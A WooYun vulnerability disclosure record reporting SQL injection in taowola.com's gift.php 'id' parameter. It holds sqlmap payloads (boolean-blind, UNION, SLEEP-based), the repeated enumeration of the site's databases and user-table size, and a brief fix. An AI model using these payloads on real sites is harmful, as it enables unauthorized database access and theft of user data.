{"id": 79083, "wybug_id": "wooyun-2015-0158917", "wybug_title": "淘我啦某处存在SQL注入(11W用户信息泄露)", "wybug_corp": "淘我啦", "wybug_author": "k0_pwn", "wybug_date": "2015-12-07 22:16", "wybug_open_date": "2016-01-21 18:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-01-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  \nhttp://www.taowola.com/gift.php?type=info&id=200\nid参数存在注入\nsqlmap identified the following injection points with a total of 50 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=info&id=200 AND 4843=4843    Type: UNION query    Title: MySQL UNION query (NULL) - 12 columns    Payload: type=info&id=-6615 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x3a7571693a,0x5168744a575678484448,0x3a7476793a),NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: type=info&id=200 AND SLEEP(5)---web application technology: PHP 5.4.23, Nginxback-end DBMS: MySQL 5.0.11\n查看一下当前数据库和用户\nweb application technology: PHP 5.4.23, Nginxback-end DBMS: MySQL 5.0.11current user:    '10.47.36.39:12945'current database:    'taowola'current user is DBA:    False\n列数据库\nweb application technology: PHP 5.4.23, Nginxback-end DBMS: MySQL 5.0.11available databases [4]:[*] information_schema[*] mysql[*] performance_schema[*] taowola\n66个表，不全列出来了\nweb application technology: PHP 5.4.23, Nginxback-end DBMS: MySQL 5.0.11Database: taowola[66 tables]\n直接看一下数据量\nweb application technology: PHP 5.4.23, Nginxback-end DBMS: MySQL 5.0.11Database: taowola+---------------------------+---------+| Table                     | Entries |+---------------------------+---------+| wp_jifen_log              | 180981  || wp_user                   | 116896  || logs                      | 56728   || wp_items                  | 47381   |\n   漏洞证明：  \nhttp://www.taowola.com/gift.php?type=info&id=200\nid参数存在注入\nsqlmap identified the following injection points with a total of 50 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=info&id=200 AND 4843=4843    Type: UNION query    Title: MySQL UNION query (NULL) - 12 columns    Payload: type=info&id=-6615 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x3a7571693a,0x5168744a575678484448,0x3a7476793a),NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: type=info&id=200 AND SLEEP(5)---web application technology: PHP 5.4.23, Nginxback-end DBMS: MySQL 5.0.11\n查看一下当前数据库和用户\nweb application technology: PHP 5.4.23, Nginxback-end DBMS: MySQL 5.0.11current user:    '10.47.36.39:12945'current database:    'taowola'current user is DBA:    False\n列数据库\nweb application technology: PHP 5.4.23, Nginxback-end DBMS: MySQL 5.0.11available databases [4]:[*] information_schema[*] mysql[*] performance_schema[*] taowola\n66个表，不全列出来了\nweb application technology: PHP 5.4.23, Nginxback-end DBMS: MySQL 5.0.11Database: taowola[66 tables]\n直接看一下数据量\nweb application technology: PHP 5.4.23, Nginxback-end DBMS: MySQL 5.0.11Database: taowola+---------------------------+---------+| Table                     | Entries |+---------------------------+---------+| wp_jifen_log              | 180981  || wp_user                   | 116896  || logs                      | 56728   || wp_items                  | 47381   |\n   修复方案：  参数过滤   版权声明：转载请注明来源 k0_pwn@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评价\n     2016-01-22 00:00 |    \t\tk0_pwn \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:13        | 专注且自由)\t\t \n  乌云也没有评分啊。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}